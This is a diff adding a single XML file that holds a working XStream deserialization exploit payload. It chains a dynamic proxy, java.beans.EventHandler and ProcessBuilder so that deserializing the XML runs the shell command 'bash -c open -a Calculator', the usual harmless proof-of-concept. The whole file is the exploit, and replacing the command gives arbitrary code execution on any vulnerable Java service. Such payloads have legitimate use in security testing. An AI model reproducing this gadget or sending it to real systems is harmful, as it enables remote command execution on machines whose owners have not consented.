@@ -1,0 +1,13 @@
+<dynamic-proxy>
+       <interface>java.lang.Comparable</interface>
+               <handler class="java.beans.EventHandler">
+                       <target class="java.lang.ProcessBuilder">
+                               <command>
+                                       <string>bash</string>
+                                       <string>-c</string>
+                                       <string>open -a Calculator</string>
+                               </command>
+                       </target>
+                       <action>start</action>
+               </handler>
+</dynamic-proxy>
